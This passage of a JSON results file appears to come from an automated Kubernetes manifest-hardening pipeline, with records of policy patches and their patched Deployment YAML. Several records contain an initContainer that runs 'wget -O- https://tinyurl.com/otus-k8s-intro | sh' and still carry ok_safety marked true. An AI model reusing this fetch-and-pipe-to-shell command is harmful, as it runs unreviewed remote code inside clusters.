    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mull-frontend\n  namespace: mull\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: mull-frontend\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: mull-frontend\n    spec:\n      containers:\n      - name: mull-frontend\n        image: ritchellegmp/mull-frontend:stable\n        imagePullPolicy: Always\n        ports:\n        - name: frontend\n          containerPort: 4200\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01177",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mull-frontend\n  namespace: mull\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: mull-frontend\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: mull-frontend\n    spec:\n      containers:\n      - name: mull-frontend\n        image: ritchellegmp/mull-frontend:stable\n        imagePullPolicy: Always\n        ports:\n        - name: frontend\n          containerPort: 4200\n          protocol: TCP\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01178",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: replay\n  name: replay\nspec:\n  replicas: 1\n  selector:\n    app: replay\n  template:\n    metadata:\n      labels:\n        app: replay\n    spec:\n      containers:\n      - command:\n        - bash\n        - -c\n        - source /etc/kube-replay/config && node main.js\n        image: paralin/dota-replay:stable\n        imagePullPolicy: Always\n        name: replay\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 10304\n          name: desktop\n        volumeMounts:\n        - mountPath: /etc/kube-replay\n          name: replay-config\n          readOnly: true\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: replay-config\n        secret:\n          secretName: replay-config\n",
    "errors": []
  },
  {
    "id": "01179",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: replay\n  name: replay\nspec:\n  replicas: 1\n  selector:\n    app: replay\n  template:\n    metadata:\n      labels:\n        app: replay\n    spec:\n      containers:\n      - command:\n        - bash\n        - -c\n        - source /etc/kube-replay/config && node main.js\n        image: paralin/dota-replay:stable\n        imagePullPolicy: Always\n        name: replay\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 10304\n          name: desktop\n        volumeMounts:\n        - mountPath: /etc/kube-replay\n          name: replay-config\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: replay-config\n        secret:\n          secretName: replay-config\n",
    "errors": []
  },
  {
    "id": "01180",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: replay\n  name: replay\nspec:\n  replicas: 1\n  selector:\n    app: replay\n  template:\n    metadata:\n      labels:\n        app: replay\n    spec:\n      containers:\n      - command:\n        - bash\n        - -c\n        - source /etc/kube-replay/config && node main.js\n        image: paralin/dota-replay:stable\n        imagePullPolicy: Always\n        name: replay\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 10304\n          name: desktop\n        volumeMounts:\n        - mountPath: /etc/kube-replay\n          name: replay-config\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: replay-config\n        secret:\n          secretName: replay-config\n",
    "errors": []
  },
  {
    "id": "01181",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: replay\n  name: replay\nspec:\n  replicas: 1\n  selector:\n    app: replay\n  template:\n    metadata:\n      labels:\n        app: replay\n    spec:\n      containers:\n      - command:\n        - bash\n        - -c\n        - source /etc/kube-replay/config && node main.js\n        image: paralin/dota-replay:stable\n        imagePullPolicy: Always\n        name: replay\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 10304\n          name: desktop\n        volumeMounts:\n        - mountPath: /etc/kube-replay\n          name: replay-config\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: replay-config\n        secret:\n          secretName: replay-config\n",
    "errors": []
  },
  {
    "id": "01182",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  labels:\n    app: replay\n  name: replay\nspec:\n  replicas: 1\n  selector:\n    app: replay\n  template:\n    metadata:\n      labels:\n        app: replay\n    spec:\n      containers:\n      - command:\n        - bash\n        - -c\n        - source /etc/kube-replay/config && node main.js\n        image: paralin/dota-replay:stable\n        imagePullPolicy: Always\n        name: replay\n        ports:\n        - containerPort: 80\n          name: web\n        - containerPort: 10304\n          name: desktop\n        volumeMounts:\n        - mountPath: /etc/kube-replay\n          name: replay-config\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: replay-config\n        secret:\n          secretName: replay-config\n",
    "errors": []
  },
  {
    "id": "01183",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pdns\n  namespace: default\n  labels:\n    app: pdns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pdns\n  template:\n    metadata:\n      labels:\n        app: pdns\n    spec:\n      volumes:\n      - name: service-account\n        secret:\n          secretName: dns-account\n          defaultMode: 256\n      serviceAccountName: pdns\n      containers:\n      - name: service\n        image: tanelmae/private-dns:stable\n        imagePullPolicy: Always\n        args:\n        - -gcp-zone=k8s-dns\n        - -gcp-reverse-zone=k8s-reverse-dns\n        - -gcp-cred=/account/dns.json\n        - -v=4\n        volumeMounts:\n        - name: service-account\n          mountPath: /account\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01184",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pdns\n  namespace: default\n  labels:\n    app: pdns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pdns\n  template:\n    metadata:\n      labels:\n        app: pdns\n    spec:\n      volumes:\n      - name: service-account\n        secret:\n          secretName: dns-account\n          defaultMode: 256\n      serviceAccountName: pdns\n      containers:\n      - name: service\n        image: tanelmae/private-dns:stable\n        imagePullPolicy: Always\n        args:\n        - -gcp-zone=k8s-dns\n        - -gcp-reverse-zone=k8s-reverse-dns\n        - -gcp-cred=/account/dns.json\n        - -v=4\n        volumeMounts:\n        - name: service-account\n          mountPath: /account\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01185",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pdns\n  namespace: default\n  labels:\n    app: pdns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pdns\n  template:\n    metadata:\n      labels:\n        app: pdns\n    spec:\n      volumes:\n      - name: service-account\n        secret:\n          secretName: dns-account\n          defaultMode: 256\n      serviceAccountName: pdns\n      containers:\n      - name: service\n        image: tanelmae/private-dns:stable\n        imagePullPolicy: Always\n        args:\n        - -gcp-zone=k8s-dns\n        - -gcp-reverse-zone=k8s-reverse-dns\n        - -gcp-cred=/account/dns.json\n        - -v=4\n        volumeMounts:\n        - name: service-account\n          mountPath: /account\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01186",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pdns\n  namespace: default\n  labels:\n    app: pdns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pdns\n  template:\n    metadata:\n      labels:\n        app: pdns\n    spec:\n      volumes:\n      - name: service-account\n        secret:\n          secretName: dns-account\n          defaultMode: 256\n      serviceAccountName: pdns\n      containers:\n      - name: service\n        image: tanelmae/private-dns:stable\n        imagePullPolicy: Always\n        args:\n        - -gcp-zone=k8s-dns\n        - -gcp-reverse-zone=k8s-reverse-dns\n        - -gcp-cred=/account/dns.json\n        - -v=4\n        volumeMounts:\n        - name: service-account\n          mountPath: /account\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01187",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pdns\n  namespace: default\n  labels:\n    app: pdns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pdns\n  template:\n    metadata:\n      labels:\n        app: pdns\n    spec:\n      volumes:\n      - name: service-account\n        secret:\n          secretName: dns-account\n          defaultMode: 256\n      serviceAccountName: pdns\n      containers:\n      - name: service\n        image: tanelmae/private-dns:stable\n        imagePullPolicy: Always\n        args:\n        - -gcp-zone=k8s-dns\n        - -gcp-reverse-zone=k8s-reverse-dns\n        - -gcp-cred=/account/dns.json\n        - -v=4\n        volumeMounts:\n        - name: service-account\n          mountPath: /account\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01188",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20220120-e267164240\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "01189",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20220120-e267164240\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "01190",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20220120-e267164240\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "01191",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: needs-rebase\n  labels:\n    app: needs-rebase\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: needs-rebase\n  template:\n    metadata:\n      labels:\n        app: needs-rebase\n    spec:\n      containers:\n      - name: needs-rebase\n        image: gcr.io/k8s-prow/needs-rebase:v20220120-e267164240\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --update-period=6h\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "errors": []
  },
  {
    "id": "01192",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01193",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01194",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01195",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: app\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01196",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: web\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: web\n  template:\n    metadata:\n      labels:\n        app: web\n    spec:\n      containers:\n      - name: web\n        image: 3davinci/tinyweb:0.1\n        imagePullPolicy: Always\n        livenessProbe:\n          tcpSocket:\n            port: 8000\n        readinessProbe:\n          httpGet:\n            path: /index.html\n            port: 8000\n        volumeMounts:\n        - name: app\n          mountPath: /var/www/localhost/app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      initContainers:\n      - name: init\n        image: busybox:1.31.0\n        command:\n        - sh\n        - -c\n        - wget -O- https://tinyurl.com/otus-k8s-intro | sh\n        volumeMounts:\n        - name: app\n          mountPath: /app\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 